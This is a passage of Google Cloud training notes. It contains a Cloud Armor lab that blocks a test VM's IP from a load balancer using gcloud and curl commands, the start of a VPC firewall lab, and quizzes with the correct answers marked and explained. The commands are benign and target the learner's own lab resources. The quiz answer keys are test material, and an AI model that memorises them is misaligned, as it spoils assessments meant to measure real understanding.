between segments.</span></p><ol start='2' ><li><p><span>You are migrating a large ecommerce company&#39;s existing on-premises data center to Google Cloud. The on-premises network consists of geographically dispersed regional offices, each with its own network segment requiring secure isolation. However, central management and communication between all regional offices are critical for business operations. Which network topology would most effectively address these requirements in Google Cloud?</span></p></li></ol><ul><li><p><span>Mesh</span></p></li><li><p><span>Mirrored</span></p></li><li><p><span>Gated ingress and egress</span></p></li><li><p><strong><span>Hub-and-spoke</span></strong></p></li></ul><p><span>Correct! This topology establishes a central VPC (the &quot;hub&quot;) in Google  Cloud, connecting all regional VPCs (&quot;spokes&quot;) securely. This  configuration facilitates centralized management, enforces security  policies, and provides a cost-effective and manageable solution for  migrating the on-premises network while maintaining regional isolation  and communication.</span></p><p>&nbsp;</p><p><span>## </span></p><h1 id='06-networking-in-google-cloud-network-security'><span>06 Networking in Google Cloud: Network Security</span></h1><p>&nbsp;</p><h2 id='distributed-denial-of-service-ddos-protection'><span>Distributed Denial of Service (DDoS) Protection</span></h2><p>&nbsp;</p><h3 id='lab---configuring-traffic-blocklisting-with-google-cloud-armor'><span>LAB - Configuring Traffic Blocklisting with Google Cloud Armor</span></h3><p>&nbsp;</p><h4 id='overview-3'><span>Overview</span></h4><p><span>HTTP(S) Load balancing is implemented at the edge of Google&#39;s network in Google&#39;s points of presence (POP) around the world. User traffic directed to an HTTP(S) load balancer enters the POP closest to the user and is then load balanced over Google&#39;s global network to the closest backend that has sufficient capacity available.</span></p><p><a href='https://cloud.google.com/armor'><span>Google Cloud Armor</span></a><span> IP blocklists/allowlists enable you to restrict or allow access to your HTTP(S) load balancer at the edge of the Google Cloud, as close as possible to the user and to malicious traffic. This prevents malicious users or traffic from consuming resources or entering your virtual private cloud (VPC) networks.</span></p><p><span>In this lab, you will verify that the HTTP load balancer with global backends is deployed. This load balancer is automatically provisioned for you during startup. You will then create a VM to test access to the load balancer. Finally, you will stress test the load balancer and blocklist the stress test IP with Google Cloud Armor.</span></p><h4 id='objectives-2'><span>Objectives</span></h4><p><span>In this lab, you will learn how to perform the following tasks:</span></p><ul><li><p><span>Verify that the HTTP load balancer is deployed.</span></p></li><li><p><span>Create a VM to test access to the HTTP load balancer.</span></p></li><li><p><span>Use Google Cloud Armor to blocklist an IP address and restrict access to an HTTP load balancer.</span></p></li></ul><h4 id='setup-and-requirements-3'><span>Setup and requirements</span></h4><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h4 id='task-1-verify-the-http-load-balancer-is-deployed'><span>Task 1. Verify the HTTP load balancer is deployed</span></h4><p><span>In this task, you verify that the global HTTP load balancer is deployed. The HTTP load balancer is automatically created when you start the lab. This will be used for a simple web application. This application is deployed to demonstrate the capabilities of Google Cloud Armor.</span></p><ol start='' ><li><p><span>On the Google Cloud Console title bar, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>). If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Verify that the load balancer is deployed and registered by executing the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute backend-services get-health web-backend --global</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Note:</span></strong><span> Rerun this command and wait until this command returns that three instances are HEALTHY. You can also monitor it in the console (</span><strong><span>Navigation menu &gt; View All Products &gt; Network services &gt; Load balancing</span></strong><span>).</span></p><ol start='' ><li><p><span>Retrieve the load balancer IP address by executing the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute forwarding-rules describe web-rule --global</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Copy the value for the </span><strong><span>IPAddress</span></strong><span> property.</span></p></li></ol><p><span>Keep track of this IP address. It will also be used in a later section.</span></p><ol start='' ><li><p><span>Open a new browser tab and try to visit that IP address </span><code>http://{IP_ADDRESS}</code><span>.</span></p></li></ol><p><span>Replace </span><code>{IP_ADDRESS}</code><span> with the IP address of the load balancer. Do not include the curly braces when you are asked to provide the IP address.</span></p><p><span>If you get a message that the IP address doesn&#39;t support a secure connection, click </span><strong><span>Continue to site</span></strong><span>.</span></p><p><span>Keep refreshing the page until you see a page with a message similar to this:</span></p><p><img src="images/TejCgv4DW0Lq%2FQg5JjVV6H4dNY%2FEeZPTWo03qa3reCk%3D.png" referrerpolicy="no-referrer" alt="Web server notification; the server is in zone X"></p><p><strong><span>Note:</span></strong><span> It might take a couple of minutes to access the HTTP load balancer. In the meantime, you might get 404 or 502 errors. Keep trying until you see the page of one of the backends.</span></p><ol start='' ><li><p><span>In Cloud shell, use the following </span><code>curl</code><span> command to access the IP address:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">while true; do curl -m1 {IP_ADDRESS}; done</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>The responses will be from backends that have been created in different zones.</span></p><ol start='' ><li><p><span>Press </span><strong><span>CTRL+C</span></strong><span> to stop the previous command.</span></p></li></ol><h4 id='task-2-create-a-vm-to-test-access-to-the-load-balancer'><span>Task 2. Create a VM to test access to the load balancer</span></h4><ol start='' ><li><p><span>Go to </span><strong><span>Navigation menu &gt; Compute Engine</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Instance</span></strong><span>.</span></p></li><li><p><span>On the </span><strong><span>Machine configuration</span></strong><span> page, enter the following values:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><strong><span>Field</span></strong></th><th style='text-align:left;' ><strong><span>Value</span></strong><span> (type or select)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>access-test</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>REGION</code></td></tr><tr><td style='text-align:left;' ><span>Zone</span></td><td style='text-align:left;' ><code>ZONE</code></td></tr></tbody></table></figure></li><li><p><span>Leave everything else at the default and click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Once launched, click the </span><strong><span>SSH</span></strong><span> button to connect to the instance.</span></p></li><li><p><span>Run the following command on the instance to access the load balancer:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -m1 {IP_ADDRESS}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>The output should look similar to:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;!doctype html&gt;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Web server&lt;/h1&gt;&lt;h2&gt;This server is in zone: projects/104716457480/zones/ZONE&lt;/h2&gt; &lt;/body&gt;&lt;/html&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a VM to test access to the load balancer.</span></p><p>&nbsp;</p><h4 id='task-3-create-a-security-policy-with-google-cloud-armor'><span>Task 3. Create a security policy with Google Cloud Armor</span></h4><h4 id='blocklist-the-access-test-vm'><span>Blocklist the access-test VM</span></h4><p><strong><span>Note:</span></strong><span> You will now create a security policy to blocklist access to the load balancer from the access-test VM. This policy can be used to block access from a malicious client. There are ways to identify the external IP address of a client trying to access your HTTP load balancer. For example, you could examine traffic captured by VPC Flow Logs in BigQuery to determine a high volume of incoming requests.</span></p><ol start='' ><li><p><span>Go to </span><strong><span>Navigation menu &gt; Compute engine</span></strong><span>, click </span><strong><span>access-test</span></strong><span> VM and scroll down to </span><strong><span>Network interface</span></strong><span> and then copy the </span><strong><span>External IP address</span></strong><span>.</span></p></li><li><p><span>From the </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>View All Products</span></strong><span>. Go to </span><strong><span>Networking</span></strong><span> section, click </span><strong><span>Network Security</span></strong><span> &gt; </span><strong><span>Cloud Armor policies</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create policy</span></strong><span>.</span></p></li><li><p><span>Provide a name as </span><strong><span>blocklist-access-test</span></strong><span> and set the </span><strong><span>Default rule action</span></strong><span> to </span><strong><span>Allow</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Next step</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th><strong><span>Property</span></strong></th><th><strong><span>Value</span></strong></th></tr></thead><tbody><tr><td><span>Mode</span></td><td><span>Basic mode (IP addresses/ranges only)</span></td></tr><tr><td><span>Match</span></td><td><span>Enter the External IP of the </span><strong><span>access-test</span></strong><span> VM</span></td></tr><tr><td><span>Action</span></td><td><span>Deny</span></td></tr><tr><td><span>Response code</span></td><td><span>404 (Not Found)</span></td></tr><tr><td><span>Priority</span></td><td><span>1000</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> Notice that you are setting the Deny status to 404.</span></p><ol start='' ><li><p><span>Click </span><strong><span>SAVE CHANGE TO RULE</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Next step</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>+ Add Target</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Type 1</span></strong><span>, select </span><strong><span>Backend service (external application load balancer)</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Backend Service target 1</span></strong><span>, select </span><strong><span>web-backend</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Next step</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create policy</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Alternatively, you could set the default rule to Deny and only allow list traffic from authorized users/IP addresses.</span></p><p><span>Wait for the policy to be created before moving to the next step.</span></p><h4 id='verify-the-security-policy'><span>Verify the security policy</span></h4><ol start='' ><li><p><span>Return to the SSH session of the access-test VM.</span></p></li><li><p><span>Run the </span><code>curl</code><span> command again on the instance to access the load balancer:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -m1 {IP_ADDRESS}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>The output should look as follows.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;!doctype html&gt;&lt;meta charset="utf-8"&gt;&lt;meta name=viewport content="width=device-width, initial-scale=1"&gt;&lt;title&gt;404&lt;/title&gt;404 Not Found</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> It might take a couple of minutes for the security policy to take affect. If you are able to access the backends, keep trying until you get the </span><strong><span>404</span></strong><span> Not Found error.</span></p><ol start='' ><li><p><span>Try accessing the load balancer IP from your local browser. You should still be able to access it as we have only blocklisted the access-test VM.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a security policy with Google Cloud Armor.</span></p><p>&nbsp;</p><h4 id='task-4-view-google-cloud-armor-logs'><span>Task 4. View Google Cloud Armor logs</span></h4><ol start='' ><li><p><span>In the Console, from the </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>View All Products</span></strong><span>. Go to </span><strong><span>Networking</span></strong><span> section, click </span><strong><span>Network Security</span></strong><span> &gt; </span><strong><span>Cloud Armor policies</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>blocklist-access-test</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Logs</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>View policy logs</span></strong><span> and go to the latest logs. If prompted, close the notification.</span></p></li><li><p><span>Locate a log with a </span><strong><span>404</span></strong><span> and expand the log entry.</span></p></li><li><p><span>Expand </span><strong><span>httpRequest</span></strong><span>.</span></p></li><li><p><span>The request should be from the </span><strong><span>access-test</span></strong><span> VM IP address.</span></p></li><li><p><span>Explore some of the other log entries.</span></p></li></ol><h4 id='congratulations-3'><span>Congratulations!</span></h4><p><span>In this lab, you have done the following:</span></p><ul><li><p><span>Verified that the HTTP load balancer was deployed.</span></p></li><li><p><span>Created a VM to test access to the HTTP load balancer.</span></p></li><li><p><span>Used Google Cloud Armor to blocklist an IP address and restrict access to an HTTP load balancer.</span></p></li></ul><p>&nbsp;</p><h3 id='quiz-8'><span>Quiz</span></h3><ol start='' ><li><p><span>Which Google Cloud service provides defense against infrastructure and application Distributed Denial of Service (DDoS) attacks?</span></p></li></ol><ul><li><p><span>Cloud CDN</span></p></li><li><p><span>Cloud DNS</span></p></li><li><p><span>Cloud Load Balancing</span></p></li><li><p><strong><span>Google Cloud Armor</span></strong></p></li></ul><p><span>Correct. Google Cloud Armor is specifically designed to protect against  DDoS attacks at both the infrastructure and application layers. It  offers features like: </span></p><ul><li><p><span>Web Application Firewall (WAF) to filter malicious traffic</span></p></li><li><p><span>Rate limiting to control traffic spikes</span></p></li><li><p><span>DDoS attack detection and mitigation</span></p></li><li><p><span>IP whitelisting and blacklisting</span></p></li></ul><ol start='2' ><li><p><span>Which two of the following statements are true about Google Cloud Armor?</span></p></li></ol><ul><li><p><span>Google Cloud Armor is not currently compatible with any third-party partner security products.</span></p></li><li><p><strong><span>Google Cloud Armor enforces access control based on IPv4 and IPv6 addresses or CIDRs.</span></strong></p></li><li><p><strong><span>Google Cloud Armor protection is delivered at the edge of Google’s network.</span></strong></p></li><li><p><span>Google Cloud Armor is a ransomware defense service.</span></p></li></ul><p><span>Correct. This is a key advantage of Cloud Armor. By filtering traffic at the edge, it can mitigate attacks before they reach your  infrastructure, reducing the load on your resources and ensuring better  protection.</span></p><p><span>Correct. This is a core feature of Cloud Armor. It allows you to create  rules that permit or deny traffic based on the source IP address or  range. This is useful for filtering out known bad actors or restricting  access to specific regions.</span></p><p>&nbsp;</p><h2 id='controlling-access-to-vpc-networks'><span>Controlling Access to VPC Networks</span></h2><h3 id='lab---configuring-vpc-firewalls'><span>LAB - Configuring VPC Firewalls</span></h3><h4 id='overview-4'><span>Overview</span></h4><p><span>In this lab, you investigate </span><a href='https://cloud.google.com/vpc'><span>Virtual Private Cloud (VPC)</span></a><span> networks and create firewall rules to allow and deny access to a network and instances.</span></p><p><span>You begin by creating an automatic VPC network, a custom VPC network, and some VPC instances in those networks. You verify that the default-allow-ssh firewall rule is working and then compare this to the user created custom network to verify no ingress is allowed without custom firewall rules.</span></p><p><span>After deleting the default network, you use firewall rule priorities,to allow both ingress and egress of network traffic to your VMs.</span></p><h4 id='objectives-3'><span>Objectives</span></h4><p><span>In this lab, you will learn how to:</span></p><ul><li><p><span>Create an auto-mode network, a custom-mode network, and associated subnetworks.</span></p></li><li><p><span>Investigate firewall rules in the default network and then delete the default network.</span></p></li><li><p><span>Use features of firewall rules for more precise and flexible control of connections.</span></p></li></ul><h4 id='setup-and-requirements-4'><span>Setup and requirements</span></h4><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h4 id='activate-google-cloud-shell-2'><span>Activate Google Cloud Shell</span></h4><p><span>Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.</span></p><p><span>Google Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>In Cloud console, on the top right toolbar, click the Open Cloud Shell button.</span></p><p><img src="https://cdn.qwiklabs.com/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D" referrerpolicy="no-referrer" alt="Highlighted Cloud Shell icon"></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li></ol><p><span>It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your </span><em><span>PROJECT_ID</span></em><span>. For example:</span></p><p><img src="https://cdn.qwiklabs.com/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D" referrerpolicy="no-referrer" alt="Project ID highlighted in the Cloud Shell Terminal"></p><p><strong><span>gcloud</span></strong><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ul><li><p><span>You can list the active account name with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" 